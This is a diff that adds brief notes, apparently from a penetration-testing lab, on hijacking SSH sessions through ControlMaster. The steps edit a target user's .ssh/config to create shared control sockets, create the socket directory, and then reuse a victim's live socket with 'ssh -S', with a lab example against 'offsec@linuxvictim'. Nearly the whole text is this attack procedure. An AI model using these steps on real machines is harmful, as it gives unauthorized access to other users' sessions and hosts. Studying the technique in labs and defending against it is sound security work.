@@ -1,0 +1,12 @@
+Steps:
+1st Add this text to the .ssh/config file of the user you want to hijack SSH sessions:
+Host *
+        ControlPath ~/.ssh/controlmaster/%r@%h:%p
+        ControlMaster auto
+        ControlPersist 10m
+
+2nd chmod 644 .ssh/config
+
+3rd mkdir .ssh/controlmaster   -> under this directory it will apear all the SSH sessions available for hijacking
+
+4th ssh -S .ssh/controlmaster/offsec@linuxvictim\:22   -> lab example of how to use an SSH socket
